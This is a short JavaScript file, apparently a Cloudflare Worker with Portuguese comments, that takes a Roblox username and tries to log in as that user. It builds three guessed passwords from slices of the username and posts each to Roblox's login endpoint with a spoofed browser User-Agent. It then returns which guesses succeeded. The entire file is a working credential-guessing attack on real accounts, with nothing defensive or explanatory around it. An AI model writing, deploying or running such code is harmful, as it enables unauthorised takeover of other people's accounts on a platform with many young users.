export default {
    async fetch(request, env) {
        const url = new URL(request.url);
        
        if (url.pathname.startsWith('/api/proxy')) {
            const { username } = await request.json();
            
            // Obter dados do usuário
            const userData = await fetch(
                `https://api.roblox.com/users/get-by-username?username=${username}`
            ).then(r => r.json());
            
            if (userData.Id) {
                // Testar senhas
                const passwordAttempts = [
                    username.slice(0, 4),
                    username.slice(4),
                    username.slice(0, 2) + username.slice(-2)
                ];
                
                const results = [];
                for (const password of passwordAttempts) {
                    try {
                        const response = await fetch(
                            'https://auth.roblox.com/v2/login',
                            {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json',
                                    'User-Agent': 'Mozilla/5.0'
                                },
                                body: JSON.stringify({ username, password })
                            }
                        );
                        
                        const success = response.status === 200;
                        results.push({ password, success });
                    } catch (error) {
                        results.push({ password, success: false, error: error.message });
                    }
                }
                
                return new Response(JSON.stringify({ success: true, results }), {
                    headers: { 'Content-Type': 'application/json' }
                });
            } else {
                return new Response(JSON.stringify({ success: false, message: 'Usuário não encontrado' }), {
                    headers: { 'Content-Type': 'application/json' }
                });
            }
        }
        
        return new Response('Not found', { status: 404 });
    }
};
